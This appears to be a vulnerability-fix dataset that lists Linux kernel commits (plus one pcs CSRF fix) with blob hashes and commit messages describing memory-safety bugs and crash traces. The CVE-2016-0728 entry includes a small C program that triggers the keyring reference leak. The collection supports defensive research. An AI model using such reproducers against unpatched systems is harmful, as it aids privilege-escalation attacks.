ovl: fix dentry reference leak\n\nIn ovl_copy_up_locked(), newdentry is leaked if the function exits through out_cleanup as this just to out after calling ovl_cleanup() - which doesn't actually release the ref on newdentry.\n\nThe out_cleanup segment should instead exit through out2 as certainly newdentry leaks - and possibly upper does also, though this isn't caught given the catch of newdentry.\n\nWithout this fix, something like the following is seen:\n\n	BUG: Dentry ffff880023e9eb20{i=f861,n=#ffff880023e82d90} still in use (1) [unmount of tmpfs tmpfs] 	BUG: Dentry ffff880023ece640{i=0,n=bigfile}  still in use (1) [unmount of tmpfs tmpfs]\n\nwhen unmounting the upper layer after an error occurred in copyup.\n\nAn error can be induced by creating a big file in a lower layer with something like:\n\n	dd if=/dev/zero of=/lower/a/bigfile bs=65536 count=1 seek=$((0xf000))\n\nto create a large file (4.1G).  Overlay an upper layer that is too small (on tmpfs might do) and then induce a copy up by opening it writably.\n\nReported-by: Ulrich Obergfell <uobergfe@redhat.com> Signed-off-by: David Howells <dhowells@redhat.com> Signed-off-by: Miklos Szeredi <miklos@szeredi.hu> Cc: <stable@vger.kernel.org> # v3.18+

======================================================================
Commit With Fix: 
    8fff105e13041e49b82f92eef034f363a6b1c071
File(s) In Commit: 
    arch/arm64/kernel/perf_event.c
Blob(s) In Commit: 
    68a74151fa6cf84002cd3be98a0fc29f67a40b02
Blob(s) Before Fix: 
    25a5308744b1ce17e8299502be30cca1b3cca628
    78a5894b16212de5a66678cdb1687fc6c1f648c9
    aa29ecb4f80044a4f3491cdcdcfce491642bb008
    baf5afb7e6a0f7d49c205675d6e924eb2672bc80
Projects:
    0-T-0_ps4-linux
Commit Message for 8fff105e13041e49b82f92eef034f363a6b1c071:
arm64: perf: reject groups spanning multiple HW PMUs\n\nThe perf core implicitly rejects events spanning multiple HW PMUs, as in these cases the event->ctx will differ. However this validation is performed after pmu::event_init() is called in perf_init_event(), and thus pmu::event_init() may be called with a group leader from a different HW PMU.\n\nThe ARM64 PMU driver does not take this fact into account, and when validating groups assumes that it can call to_arm_pmu(event->pmu) for any HW event. When the event in question is from another HW PMU this is wrong, and results in dereferencing garbage.\n\nThis patch updates the ARM64 PMU driver to first test for and reject events from other PMUs, moving the to_arm_pmu and related logic after this test. Fixes a crash triggered by perf_fuzzer on Linux-4.0-rc2, with a CCI PMU present:\n\nBad mode in Synchronous Abort handler detected, code 0x86000006 -- IABT (current EL) CPU: 0 PID: 1371 Comm: perf_fuzzer Not tainted 3.19.0+ #249 Hardware name: V2F-1XV7 Cortex-A53x2 SMM (DT) task: ffffffc07c73a280 ti: ffffffc07b0a0000 task.ti: ffffffc07b0a0000 PC is at 0x0 LR is at validate_event+0x90/0xa8 pc : [<0000000000000000>] lr : [<ffffffc000090228>] pstate: 00000145 sp : ffffffc07b0a3ba0\n\n[<          (null)>]           (null) [<ffffffc0000907d8>] armpmu_event_init+0x174/0x3cc [<ffffffc00015d870>] perf_try_init_event+0x34/0x70 [<ffffffc000164094>] perf_init_event+0xe0/0x10c [<ffffffc000164348>] perf_event_alloc+0x288/0x358 [<ffffffc000164c5c>] SyS_perf_event_open+0x464/0x98c Code: bad PC value\n\nAlso cleans up the code to use the arm_pmu only when we know that we are dealing with an arm pmu event.\n\nCc: Will Deacon <will.deacon@arm.com> Acked-by: Mark Rutland <mark.rutland@arm.com> Acked-by: Peter Ziljstra (Intel) <peterz@infradead.org> Signed-off-by: Suzuki K. Poulose <suzuki.poulose@arm.com> Signed-off-by: Will Deacon <will.deacon@arm.com>

======================================================================
Commit With Fix: 
    951b6a0717db97ce420547222647bcc40bf1eacd
File(s) In Commit: 
    net/bluetooth/rfcomm/sock.c
Blob(s) In Commit: 
    7511df72347f303f3342b8d8243581f327ecd068
Blob(s) Before Fix: 
    1a17850d093cd652621ac54833c53b8dabd395bc
    1aaccf63747937bb1f335c1490bae29c9ff898e7
    1cf57622473aa70d626e1df5ad867800ab4cfe6e
    216068f4af129b64a99b37e1311df19c40f61ca4
    2348176401a0b19ad3b5e9129999381f43da50a0
    297729cf07887c01964af6b4b18b2adadb45541b
    30b3721dc6d77d96be4bdb412ee90c49b8976dc9
    3c2d3e4aa2f58a271bea6632451edd21b92668a9
    3c6d2c8ac1a47bc7f5a96b576ca93e9542ee4fe3
    5f9e5e8b92c9f7d12f235e436ab70d1fbb47991a
    640028a2183cd9c136b8243cee0b0675f3e9b5fc
    7ca014daa5ab815bc129436ef533a9c22fd9218a
    825e8fb5114b16a5276bf7c6ee251883c6f0bfd2
    8a20aaf1f2316676564501c49bb59c3fe56c898b
    8bbbb5ec468c373f86c6caafe9187f3684775915
    8d1edd7207dfc2a1342471ab4e91d115a27cdb7d
    90bb53aa4beed9a20488ffb842837123eda716a1
    a0050de6f1f1ee50c3738ac41b9c97d880f4945c
    a55a43e9f70e9d35181f1272c3897ac43856a6d9
    a670df3995e2651d046da1924d7ba8d1d4c8c81b
    aa1a814ceddca77f790f0c570e9c89ef08ebe186
    ac3c650cb234f9985ddf0b54924db9000c4586c3
    aea2bdd1510f2b4f083a4581105228b927cde858
    b2338e971b335c3d100337709a42a729a5df188a
    c603a5eb47204ffae6eb4890da75e7e3c0394df9
    ce3f6658f4b284f627325021d59920262f8a7afc
    d606e9212291608ea2e266238c0f65ce18d0c311
    e8922de3c7255bd05af02e18db9be77d97bb052d
    f066678faeee838efae16243111a1bb51f47c8f3
    f651edeb822a8f505c281981decde733cb1bb400
    f9e9a8148a43d0932076a6254f54812b8034858d
Projects:
    0-T-0_ps4-linux
Commit Message for 951b6a0717db97ce420547222647bcc40bf1eacd:
Bluetooth: Fix potential NULL dereference in RFCOMM bind callback\n\naddr can be NULL and it should not be dereferenced before NULL checking.\n\nSigned-off-by: Jaganath Kanakkassery <jaganath.k@samsung.com> Signed-off-by: Marcel Holtmann <marcel@holtmann.org>

======================================================================
Commit With Fix: 
    6934da9238da947628be83635e365df41064b09b
File(s) In Commit: 
    fs/ext4/ext4_jbd2.c
Blob(s) In Commit: 
    e770c1ee4613ed6084518f2ec9dca0ff9e53a29a
Blob(s) Before Fix: 
    0074e0d23d6ef77eb41f4c79357cac0b70696176
    0b3af57acaefa2e4e84635e151701797c4922915
    0cf9f1e03da5daa119829acc632f83494dba9657
    17ac112ab1012bd88ff32d145f27a29f025efdde
    1be3996b5942f7c4dd6706bf93e3bac69cc36123
    23349f00e77c8b8ce7d47dd1d1b8ae85ddafd368
    3445035c7e015e9460f2cd3f74b698bf823cabb6
    3517d5af257437c2033c15d536301e1b499c0206
    3fe29de832c825e390b8d59d818b5ec37a8eb61f
    44c89188c62cec682b72cc9137319220b25abe48
    451eb404533095fc323218fe5ea0f3caa0af8b16
    4f60c99881160a59e871d218e9095d6f5811a04f
    63f5c79dd1388e784068f9c5c4839ceef1deac25
    6a9409920deef2f6040b8d7279114cfc0612221d
    7c70b08d104c002e129415d197728d2e6f014e35
    87530a0928f84f38127f7d5d70933c8803d71514
    aca17901758249d4329d780714e328ef42851e35
    b4323ba846b52ad09fe0740699ea2d82ff92ba65
    b8357f17f34f0510bbcc69982e1d9cea1bb0c096
    bea6bf8d834796dee2d568e13819452e3ed78655
    bfa65b49d4243d75a5c73456fc2ee4e3698537f4
    c3d89344a9506816b6dbb3647d337c8354884f70
    c3fb607413ed4345ec1371611bd80ded541a3c02
    d0b8f9838e811e0a36562541208bcb8d90f4f6f7
    d4184318181878b023931078377ae17c9568a208
    dd106b1d5d89155d850f5320b7739342455959bd
    ddc335baf371de0415cbb28d43dfe70d5d3344b0
Projects:
    0-T-0_ps4-linux
Commit Message for 6934da9238da947628be83635e365df41064b09b:
ext4: fix potential use after free in __ext4_journal_stop\n\nThere is a use-after-free possibility in __ext4_journal_stop() in the case that we free the handle in the first jbd2_journal_stop() because we're referencing handle->h_err afterwards. This was introduced in 9705acd63b125dee8b15c705216d7186daea4625 and it is wrong. Fix it by storing the handle->h_err value beforehand and avoid referencing potentially freed handle.\n\nFixes: 9705acd63b125dee8b15c705216d7186daea4625 Signed-off-by: Lukas Czerner <lczerner@redhat.com> Reviewed-by: Andreas Dilger <adilger@dilger.ca> Cc: stable@vger.kernel.org

======================================================================
Commit With Fix: 
    f3951a3709ff50990bf3e188c27d346792103432
File(s) In Commit: 
    drivers/scsi/sg.c
Blob(s) In Commit: 
    503ab8b46c0b4e8a73d7e826ba1aaf3be1abd6b0
Blob(s) Before Fix: 
    07b2ea1fbf0dd51b828cc10cfefc78f4e99341ae
    0cbc1fb45f10eb90ac74b1a20a2c755c4dc6a3cb
    2270bd51f9c2c240c669e562eb77052f89425a83
    441a1c5b8974a2ffaf9d104924cdfa58daa54713
    53268aaba5597f5a6acc5995f4cafaf39cfa338b
    5cbc4bb1b395c6174e30fd0d8f73401408f526f9
    5e820674432ca38c46ad154b831c8eb19e974d34
    60354449d9ed1cc16f7ca43fdef340c935d2b1c8
    9d7b7db75e4b96b6fbb33bf24b91c205add07d79
    b14f64cb97245ce8d50f21d3e83683831e71aa95
    df5e961484e108312f6f01765882dd4319d584f7
    eacd46bb36b95fe2b5caf6e82f3940427a250910
Projects:
    0-T-0_ps4-linux
Commit Message for f3951a3709ff50990bf3e188c27d346792103432:
sg: Fix double-free when drives detach during SG_IO\n\nIn sg_common_write(), we free the block request and return -ENODEV if the device is detached in the middle of the SG_IO ioctl().\n\nUnfortunately, sg_finish_rem_req() also tries to free srp->rq, so we end up freeing rq->cmd in the already free rq object, and then free the object itself out from under the current user.\n\nThis ends up corrupting random memory via the list_head on the rq object. The most common crash trace I saw is this:\n\n  ------------[ cut here ]------------   kernel BUG at block/blk-core.c:1420!   Call Trace:   [<ffffffff81281eab>] blk_put_request+0x5b/0x80   [<ffffffffa0069e5b>] sg_finish_rem_req+0x6b/0x120 [sg]   [<ffffffffa006bcb9>] sg_common_write.isra.14+0x459/0x5a0 [sg]   [<ffffffff8125b328>] ? selinux_file_alloc_security+0x48/0x70   [<ffffffffa006bf95>] sg_new_write.isra.17+0x195/0x2d0 [sg]   [<ffffffffa006cef4>] sg_ioctl+0x644/0xdb0 [sg]   [<ffffffff81170f80>] do_vfs_ioctl+0x90/0x520   [<ffffffff81258967>] ? file_has_perm+0x97/0xb0   [<ffffffff811714a1>] SyS_ioctl+0x91/0xb0   [<ffffffff81602afb>] tracesys+0xdd/0xe2     RIP [<ffffffff81281e04>] __blk_put_request+0x154/0x1a0\n\nThe solution is straightforward: just set srp->rq to NULL in the failure branch so that sg_finish_rem_req() doesn't attempt to re-free it.\n\nAdditionally, since sg_rq_end_io() will never be called on the object when this happens, we need to free memory backing ->cmd if it isn't embedded in the object itself.\n\nKASAN was extremely helpful in finding the root cause of this bug.\n\nSigned-off-by: Calvin Owens <calvinowens@fb.com> Acked-by: Douglas Gilbert <dgilbert@interlog.com> Signed-off-by: Martin K. Petersen <martin.petersen@oracle.com>

======================================================================
Commit With Fix: 
    12ca6ad2e3a896256f086497a7c7406a547ee373
File(s) In Commit: 
    kernel/events/core.c
Blob(s) In Commit: 
    0a791a2203dc7b93e9e53cc2669c531fb9f135c4
Blob(s) Before Fix: 
    fd7de0418fbe51c53c1d005aac0cac607e3c2d07
Projects:
    0-T-0_ps4-linux
Commit Message for 12ca6ad2e3a896256f086497a7c7406a547ee373:
perf: Fix race in swevent hash\n\nThere's a race on CPU unplug where we free the swevent hash array while it can still have events on. This will result in a use-after-free which is BAD.\n\nSimply do not free the hash array on unplug. This leaves the thing around and no use-after-free takes place.\n\nWhen the last swevent dies, we do a for_each_possible_cpu() iteration anyway to clean these up, at which time we'll free it, so no leakage will occur.\n\nReported-by: Sasha Levin <sasha.levin@oracle.com> Tested-by: Sasha Levin <sasha.levin@oracle.com> Signed-off-by: Peter Zijlstra (Intel) <peterz@infradead.org> Cc: Arnaldo Carvalho de Melo <acme@redhat.com> Cc: Frederic Weisbecker <fweisbec@gmail.com> Cc: Jiri Olsa <jolsa@redhat.com> Cc: Linus Torvalds <torvalds@linux-foundation.org> Cc: Peter Zijlstra <peterz@infradead.org> Cc: Stephane Eranian <eranian@google.com> Cc: Thomas Gleixner <tglx@linutronix.de> Cc: Vince Weaver <vincent.weaver@maine.edu> Signed-off-by: Ingo Molnar <mingo@kernel.org>

======================================================================
Commit With Fix: 
    dd42bf1197144ede075a9d4793123f7689e164bc
File(s) In Commit: 
    drivers/tty/tty_ldisc.c
Blob(s) In Commit: 
    a054d03c22e7b7376824927ce577d46644b01f16
Blob(s) Before Fix: 
    1afe192bef6a7e8a795c91a3cf38a26615b6f2a1
    24b95db75d84f8d6f42705bdfb57b622abcce322
    2d822aa259b2f73ad93212c949e900701d776f04
    3737f55272d2c1184463edc3714f89fb2724730e
    5af8f1874c1aab02fc16dbb0950d7264caa282ca
    629e3c865072035f14fd4e6ece5a2544bcbf713c
    6458e11e8e9d656daef35b0a5aaddc21dcfd1804
    68947f6de5ad6339adea804182597229c3eb1d38
    71750cbac31f745a6a899bc598cf0af1b84556b2
    9ec12504634368b4f8c49fa43bdf5dc79331175c
    c07fb5d9bcf9b5429689a908417021fb5716e8f9
    c5782294e53261e701f13292b5732c231cfb9d14
    e4603b09863a8fa5ffd4467e81a463538f0533bb
Projects:
    0-T-0_ps4-linux
Commit Message for dd42bf1197144ede075a9d4793123f7689e164bc:
tty: Prevent ldisc drivers from re-using stale tty fields\n\nLine discipline drivers may mistakenly misuse ldisc-related fields when initializing. For example, a failure to initialize tty->receive_room in the N_GIGASET_M101 line discipline was recently found and fixed [1]. Now, the N_X25 line discipline has been discovered accessing the previous line discipline's already-freed private data [2].\n\nHarden the ldisc interface against misuse by initializing revelant tty fields before instancing the new line discipline.\n\n[1]     commit fd98e9419d8d622a4de91f76b306af6aa627aa9c     Author: Tilman Schmidt <tilman@imap.cc>     Date:   Tue Jul 14 00:37:13 2015 +0200\n\n    isdn/gigaset: reset tty->receive_room when attaching ser_gigaset\n\n[2] Report from Sasha Levin <sasha.levin@oracle.com>     [  634.336761] ==================================================================     [  634.338226] BUG: KASAN: use-after-free in x25_asy_open_tty+0x13d/0x490 at addr ffff8800a743efd0     [  634.339558] Read of size 4 by task syzkaller_execu/8981     [  634.340359] =============================================================================     [  634.341598] BUG kmalloc-512 (Not tainted): kasan: bad access detected     ...     [  634.405018] Call Trace:     [  634.405277] dump_stack (lib/dump_stack.c:52)     [  634.405775] print_trailer (mm/slub.c:655)     [  634.406361] object_err (mm/slub.c:662)     [  634.406824] kasan_report_error (mm/kasan/report.c:138 mm/kasan/report.c:236)     [  634.409581] __asan_report_load4_noabort (mm/kasan/report.c:279)     [  634.411355] x25_asy_open_tty (drivers/net/wan/x25_asy.c:559 (discriminator 1))     [  634.413997] tty_ldisc_open.isra.2 (drivers/tty/tty_ldisc.c:447)     [  634.414549] tty_set_ldisc (drivers/tty/tty_ldisc.c:567)     [  634.415057] tty_ioctl (drivers/tty/tty_io.c:2646 drivers/tty/tty_io.c:2879)     [  634.423524] do_vfs_ioctl (fs/ioctl.c:43 fs/ioctl.c:607)     [  634.427491] SyS_ioctl (fs/ioctl.c:622 fs/ioctl.c:613)     [  634.427945] entry_SYSCALL_64_fastpath (arch/x86/entry/entry_64.S:188)\n\nCc: Tilman Schmidt <tilman@imap.cc> Cc: Sasha Levin <sasha.levin@oracle.com> Signed-off-by: Peter Hurley <peter@hurleysoftware.com> Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>

======================================================================
Commit With Fix: 
    76cc404bfdc0d419c720de4daaf2584542734f42
File(s) In Commit: 
    arch/arm/kernel/sys_oabi-compat.c
Blob(s) In Commit: 
    087acb569b63a4bd90982e0c9b15fc2313636c53
Blob(s) Before Fix: 
    02ec5f8f6d9a7942bf8bd835fed46bcb84c318c8
    3e94811690ce1c510beb49e2bf15edea9e0a4fa7
    5f221acd21aebb3ca1c2ee560fb68241bc1e02c9
    af0aaebf4de62e16e70fcfcad8ccafece2879217
    b83f3b7737fb9dce2a18c66a086aac2430e98cf6
    b9786f491873fae6a2f448e85b3fd76eb7511665
    e90a3148f38540c98c9f7a34ccce3f9ab7de7581
Projects:
    0-T-0_ps4-linux
Commit Message for 76cc404bfdc0d419c720de4daaf2584542734f42:
[PATCH] arm: fix handling of F_OFD_... in oabi_fcntl64()\n\nCc: stable@vger.kernel.org # 3.15+ Reviewed-by: Jeff Layton <jeff.layton@primarydata.com> Signed-off-by: Al Viro <viro@zeniv.linux.org.uk>

======================================================================
Commit With Fix: 
    c623b33b4e9599c6ac5076f7db7369eb9869aa04
File(s) In Commit: 
    arch/arm64/kernel/sys.c
Blob(s) In Commit: 
    75151aaf1a52025237be5e0becc8ffac514bae2c
Blob(s) Before Fix: 
    26fe8ea93ea2b18d7f87e45203bfd9633cdfe5bc
    3fa98ff14f0eea5a536dd1bbc159d6161a0c9a0d
    72981bae10ebaa41d9a9b26743121640ceb40acb
    8292a9b090f8d72ab570eaa4e24a4cb9739c252c
    b120df37de3552e5a68479294ef9e6b037ea97fb
    b44065fb16160c62d3fa113d0a86f1dd1e4564dc
    dec351a9f3d6661a12965f6cbd2e5ee56b8cb998
    df20b79188549ef6771207c77d0b97e420c2fcd0
Projects:
    0-T-0_ps4-linux
Commit Message for c623b33b4e9599c6ac5076f7db7369eb9869aa04:
arm64: make sys_call_table const\n\nAs with x86, mark the sys_call_table const such that it will be placed in the .rodata section. This will cause attempts to modify the table (accidental or deliberate) to fail when strict page permissions are in place. In the absence of strict page permissions, there should be no functional change.\n\nSigned-off-by: Mark Rutland <mark.rutland@arm.com> Acked-by: Will Deacon <will.deacon@arm.com> Signed-off-by: Catalin Marinas <catalin.marinas@arm.com>

======================================================================
Commit With Fix: 
    dd504589577d8e8e70f51f997ad487a4cb6c026f
File(s) In Commit: 
    crypto/algif_skcipher.c
Blob(s) In Commit: 
    f4431bc1ce430203b374ae757e627d808c6f17a4
Blob(s) Before Fix: 
    5c756b30e79b1ec495c39a9d6754af6825fc61ec
    df483f9bb811086bf97b901bf95eca7743f69a66
Projects:
    0-T-0_ps4-linux
Commit Message for dd504589577d8e8e70f51f997ad487a4cb6c026f:
crypto: algif_skcipher - Require setkey before accept(2)\n\nSome cipher implementations will crash if you try to use them without calling setkey first.  This patch adds a check so that the accept(2) call will fail with -ENOKEY if setkey hasn't been done on the socket yet.\n\nCc: stable@vger.kernel.org Reported-by: Dmitry Vyukov <dvyukov@google.com> Signed-off-by: Herbert Xu <herbert@gondor.apana.org.au> Tested-by: Dmitry Vyukov <dvyukov@google.com>

======================================================================
Commit With Fix: 
    b9e7f061788c3b86a0c67d2d4158f067ec5eb625
File(s) In Commit: 
    pcsd/pcsd.rb
Blob(s) In Commit: 
    847eb1190c03890a8f6ce432c7eaaa7e9fb61154
Blob(s) Before Fix: 
    349e236f0228df14021a4dcaf62dc1605a14af16
Projects:
    AdamWill_pcs
Commit Message for b9e7f061788c3b86a0c67d2d4158f067ec5eb625:
fix CSRF vulnerability\n\n * requests /remote/* (GET and POST) and /run_pcs are accessible only with token authentication  * all web UI requests are accessible only with session authentication  * all web UI requests (except for /manage, /managec/<cluster>/main, /permissions ) must    include header: X-Requested-With: XMLHttpRequest

======================================================================
Commit With Fix: 
    5c17c861a357e9458001f021a7afa7aab9937439
File(s) In Commit: 
    drivers/tty/tty_io.c
Blob(s) In Commit: 
    5cec01c75691a6b7ee58ea65346c05572db1bab1
Blob(s) Before Fix: 
    02785d844354be01b9774ad10e70ab398297c6da
    0508a1d8e4cd73a7b679f9cc70d2e19f0716b69a
    0c41dbcb90b8bc7d8ab430d562206e7c2469411f
    2eefaa6e3e3a4af9a5ab2b03cf03f9e75a04ca1d
    4f35b43e24759c5ab2ae5bcfd7a0fd49672ed3d8
    51f066aa375e64789e03b9a527679e3a0a7e1c8d
    56d3a6bced082c2e7ba352bee66f439ab645d45e
    892c923547450518cb5d7a4714f570a6803253bd
    a1b36bf545e82acc99f75bff77e785ff1f652495
    bcc8e1e8bb720996cf73438c67a397362173edca
Projects:
    0-T-0_ps4-linux
Commit Message for 5c17c861a357e9458001f021a7afa7aab9937439:
tty: Fix unsafe ldisc reference via ioctl(TIOCGETD)\n\nioctl(TIOCGETD) retrieves the line discipline id directly from the ldisc because the line discipline id (c_line) in termios is untrustworthy  userspace may have set termios via ioctl(TCSETS*) without actually changing the line discipline via ioctl(TIOCSETD).\n\nHowever, directly accessing the current ldisc via tty->ldisc is unsafe  the ldisc ptr dereferenced may be stale if the line discipline is changing via ioctl(TIOCSETD) or hangup.\n\nWait for the line discipline reference (just like read() or write()) to retrieve the "current" line discipline id.\n\nCc: <stable@vger.kernel.org> Signed-off-by: Peter Hurley <peter@hurleysoftware.com> Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>

======================================================================
Commit With Fix: 
    23567fd052a9abb6d67fe8e7a9ccdd9800a540f2
File(s) In Commit: 
    security/keys/process_keys.c
Blob(s) In Commit: 
    e6d50172872fb2b516f7c88fa3e4ba3e814ffa1a
Blob(s) Before Fix: 
    0cf8a130a267ca58fbc5599787c93b9913cfc576
    1068cb1939b3122ca857b042ac0df9d304cda6a7
    20e4bf57aec8b6418bf4d4df86c616903121c28c
    2217dfec7996159797abce9d2480fa249691cf28
    40a88523978256278e64ace2befc3e45f9868de9
    42defae1e161632e93b13b8194af1a30a09f2492
    43b4cddbf2b39ebd838e3849a1e59e9c7c22c945
    4e56371f239f9f9fc0f46a5c59f519dba72d834f
    4ed909142956980d23375a45edd974d866dbccd0
    5c23afb31ece464ad0165e1a3fb052a8969244c5
    7877e5cd4e2347413b65b72916f5e71cfda86de0
    a3f85d2a00bb469391fc9a9a504c949e653d4a16
    a77d66e8f09b94427073140b2a5a9bcc2a542900
    ac1d5b2b1626c0e86453f9bbfdb4e814a8301135
    adbfddd7e00b65e296832776fba8d8cb2daa308b
    bd536cb221e237c6cab654b4d4d927daf3f27340
    d5b25e535d3a5ad2ef567015bc4915d06b9f3f5e
    f58a5aa05fa4594f60c6b7a0806363786a8ec154
Projects:
    0-T-0_ps4-linux
Commit Message for 23567fd052a9abb6d67fe8e7a9ccdd9800a540f2:
KEYS: Fix keyring ref leak in join_session_keyring()\n\nThis fixes CVE-2016-0728.\n\nIf a thread is asked to join as a session keyring the keyring that's already set as its session, we leak a keyring reference.\n\nThis can be tested with the following program:\n\n	#include <stddef.h> 	#include <stdio.h> 	#include <sys/types.h> 	#include <keyutils.h>\n\n	int main(int argc, const char *argv[]) 	{ 		int i = 0  		key_serial_t serial \n\n		serial = keyctl(KEYCTL_JOIN_SESSION_KEYRING, 				"leaked-keyring")  		if (serial < 0) { 			perror("keyctl")  			return -1  		}\n\n		if (keyctl(KEYCTL_SETPERM, serial, 			   KEY_POS_ALL | KEY_USR_ALL) < 0) { 			perror("keyctl")  			return -1  		}\n\n		for (i = 0  i < 100  i++) { 			serial = keyctl(KEYCTL_JOIN_SESSION_KEYRING, 					"leaked-keyring")  			if (serial < 0) { 				perror("keyctl")  				return -1  			} 		}\n\n		return 0  	}\n\nIf, after the program has run, there something like the following line in /proc/keys:\n\n3f3d898f I--Q---   100 perm 3f3f0000     0     0 keyring   leaked-keyring: empty\n\nwith a usage count of 100 * the number of times the program has been run, then the kernel is malfunctioning.  If leaked-keyring has zero usages or has been garbage collected, then the problem is fixed.\n\nReported-by: Yevgeny Pats <yevgeny@perception-point.io> Signed-off-by: David Howells <dhowells@redhat.com> Acked-by: Don Zickus <dzickus@redhat.com> Acked-by: Prarit Bhargava <prarit@redhat.com> Acked-by: Jarod Wilson <jarod@redhat.com> Signed-off-by: James Morris <james.l.morris@oracle.com>

======================================================================
Commit With Fix: 
    23c8a812dc3c621009e4f0e5342aa4e2ede1ceaa
File(s) In Commit: 
    lib/asn1_decoder.c
Blob(s) In Commit: 
    554522934c442ae15c01b1b1266e8e3e9515bfbd
Blob(s) Before Fix: 
    11b9b01fda6b67303db4a7df22c19e2c35c4c095
    1a000bb050f9f91a01e50f429b20238e19d161c8
    2b3f46c049d458a590d080823b344da3b3229f7c
    3807eadd095c974dffcf8c56083e95a71bdcbac1
    621017e75cba5d6426a49074be52421ddd55be20
    762d152f73582e53f121470a9c958ef3a7977ff1
    76d110301251d59e736109751cfafdc66371335b
    d8247b430a6796f5f65721155d6aaddbf935e994
    dc14beae2c9aac7df010cdc36e861e33d34a1103
Projects:
    0-T-0_ps4-linux
Commit Message for 23c8a812dc3c621009e4f0e5342aa4e2ede1ceaa:
KEYS: Fix ASN.1 indefinite length object parsing\n\nThis fixes CVE-2016-0758.\n\nIn the ASN.1 decoder, when the length field of an ASN.1 value is extracted, it isn't validated against the remaining amount of data before being added to the cursor.  With a sufficiently large size indicated, the check:\n\n	datalen - dp < 2\n\nmay then fail due to integer overflow.\n\nFix this by checking the length indicated against the amount of remaining data in both places a definite length is determined.\n\nWhilst we're at it, make the following changes:\n\n (1) Check the maximum size of extended length does not exceed the capacity      of the variable it's being stored in (len) rather than the type that      variable is assumed to be (size_t).\n\n (2) Compare the EOC tag to the symbolic constant ASN1_EOC rather than the      integer 0.\n\n (3) To reduce confusion, move the initialisation of len outside of:\n\n	for (len = 0  n > 0  n--) {\n\n     since it doesn't have anything to do with the loop counter n.\n\nSigned-off-by: David Howells <dhowells@redhat.com> Reviewed-by: Mimi Zohar <zohar@linux.vnet.ibm.com> Acked-by: David Woodhouse <David.Woodhouse@intel.com> Acked-by: Peter Jones <pjones@redhat.com>

======================================================================
Commit With Fix: 
    8a5e5e02fc83aaf67053ab53b359af08c6c49aaf
File(s) In Commit: 
    include/linux/poison.h
Blob(s) In Commit: 
    253c9b4198effbb6bd29449a507340265760afa5
Blob(s) Before Fix: 
    0c27bdf142334570b0090b8c211f419ecccfbe5b
    1fd6c72b90c4722d0d5f1994f525b8bedea4cd9a
    2110a81c5e2afaab47ec5cb107cf17503d731317
    317e16de09e508ed64b87dae6c5006b1efcb129d
    51334edec506815a70868dd451d5c72944ed0a59
    752d76404cd003315150be75b700cc3c1a63e149
    e9d58e1f366ada1f503dec64c751a703e4d98878
    eae9c383e7cca003b79b6bf4fa26a7ebcfa5357e
Projects:
    0-T-0_ps4-linux
Commit Message for 8a5e5e02fc83aaf67053ab53b359af08c6c49aaf:
include/linux/poison.h: fix LIST_POISON{1,2} offset\n\nPoison pointer values should be small enough to find a room in non-mmap'able/hardly-mmap'able space.  E.g.  on x86 "poison pointer space" is located starting from 0x0.  Given unprivileged users cannot mmap anything below mmap_min_addr, it should be safe to use poison pointers lower than mmap_min_addr.\n\nThe current poison pointer values of LIST_POISON{1,2} might be too big for mmap_min_addr values equal or less than 1 MB (common case, e.g.  Ubuntu uses only 0x10000).  There is little point to use such a big value given the "poison pointer space" below 1 MB is not yet exhausted.  Changing it to a smaller value solves the problem for small mmap_min_addr setups.\n\nThe values are suggested by Solar Designer: http://www.openwall.com/lists/oss-security/2015/05/02/6\n\nSigned-off-by: Vasily Kulikov <segoon@openwall.com> Cc: Solar Designer <solar@openwall.com> Cc: Thomas Gleixner <tglx@linutronix.de> Cc: "Kirill A. Shutemov" <kirill.shutemov@linux.intel.com> Signed-off-by: Andrew Morton <akpm@linux-foundation.org> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

======================================================================
Commit With Fix: 
    ab676b7d6fbf4b294bf198fb27ade5b0e865c7ce
File(s) In Commit: 
    fs/proc/task_mmu.c
Blob(s) In Commit: 
    6dee68d013ffa69f1f6c9d49873f17f19eb3874d
Blob(s) Before Fix: 
    1030a716d155b4a19a91972b2ead074733b4add9
    107d026f5d6e0cbebc068fce65f201f167c425c5
    246eae84b13b1be4bf36bdf48fe50b178a9cb407
    3e636d864d5666aa2b7a58a5f61af214e6d30832
    4e0388cffe3db3f7ee88b9ab812d89c056d8c60b
    5138e781737a075078728d654dd03542dc559653
    5afaa58a863012d83a69763b2e65c9db67fe2ada
    6396f88c668738521c9a7c95b89ac48c49ae6305
    65fc60a07c47ba7fb13879f130c4c9c93046c18f
    69aa378e60d9786c313458be4d5e8a9fd1d2764e
    7366e9d63cee7d8658e9fed949a2fe7b22519c6f
    7dcd2a250495d9a1777e6d7992637fb0a4897a81
    88f9b8352742c727851e8e96e7b2d8d9888ad92f
    956b75d61809f06cdf433411456bb08278726eb5
    9afa35d045d70ac0af6235f0298b7cef4bce2f60
    aea2d0bf7174496f7498581e01010076ed01c822
    c34156888d706d444a45fd171299ff9548bab93c
    c4b2646b6d7c66f7b1c37d6fbaf033cc5ccaa561
    ca1e091881d44fe5797924d5a34daca41f8166e9
    ca5ce7f9f800934d0252598ec5491bed71dc581d
    cfa63ee92c96c9e8b715fc73864ca81053c2b237
    dfc791c42d6491c6d1a4537e6ee5d7c9bd21a24b
    dfd73a4616ce565bfccb996a50f5eb549fe41fe8
    e2d46adb54b42a76608a0cbf938d55529bd6c851
    e418c5abdb0ef954eed21771ca0ff1fe9958077d
    fb52b548080da50cf2cece633c2585601485fc09
Projects:
    0-T-0_ps4-linux
Commit Message for ab676b7d6fbf4b294bf198fb27ade5b0e865c7ce:
pagemap: do not leak physical addresses to non-privileged userspace\n\nAs pointed by recent post[1] on exploiting DRAM physical imperfection, /proc/PID/pagemap exposes sensitive information which can be used to do attacks.\n\nThis disallows anybody without CAP_SYS_ADMIN to read the pagemap.\n\n[1] http://googleprojectzero.blogspot.com/2015/03/exploiting-dram-rowhammer-bug-to-gain.html\n\n[ Eventually we might want to do anything more finegrained, but for now   this is the simple model.   - Linus ]\n\nSigned-off-by: Kirill A. Shutemov <kirill.shutemov@linux.intel.com> Acked-by: Konstantin Khlebnikov <khlebnikov@openvz.org> Acked-by: Andy Lutomirski <luto@amacapital.net> Cc: Pavel Emelyanov <xemul@parallels.com> Cc: Andrew Morton <akpm@linux-foundation.org> Cc: Mark Seaborn <mseaborn@chromium.org> Cc: stable@vger.kernel.org Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

======================================================================
